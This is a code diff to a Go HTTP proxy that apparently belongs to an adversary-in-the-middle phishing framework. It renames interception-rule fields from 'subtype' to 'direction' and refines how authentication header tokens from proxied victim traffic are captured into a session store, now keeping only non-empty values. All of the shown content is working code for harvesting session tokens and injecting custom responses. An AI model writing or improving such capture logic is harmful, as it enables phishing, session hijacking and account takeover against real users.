@@ -1091,7 +1091,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						for _, ic := range pl.intercept {
 							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
 							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
-							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) && ic.subtype == "request" {
+							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) && ic.direction == "request" {
 								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
 							}
 						}
@@ -1260,10 +1260,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					for k, v := range pl.httpAuthTokens {
 						if _, ok := s.HttpTokens[k]; !ok {
 							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
-								if (v.subtype == "request") {
-									s.HttpTokens[k] = resp.Request.Header.Get(v.header)
-								} else if (v.subtype == "response") {
-									s.HttpTokens[k] = resp.Header.Get(v.header)
+								hv := ""
+								if (v.direction == "request") {
+									hv = resp.Request.Header.Get(v.header)
+								} else if (v.direction == "response") {
+									hv = resp.Header.Get(v.header)
+								}
+								if hv != "" {
+									s.HttpTokens[k] = hv
 								}
 							}
 						}
@@ -1446,7 +1450,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				for _, ic := range pl.intercept {
 					//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
 					//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
-					if ic.domain == resp.Request.Host && ic.path.MatchString(resp.Request.URL.Path) && ic.subtype == "response" {
+					if ic.domain == resp.Request.Host && ic.path.MatchString(resp.Request.URL.Path) && ic.direction == "response" {
 						return p.interceptResponse(resp.Request, ic.http_status, ic.body, ic.mime)
 					}
 				}
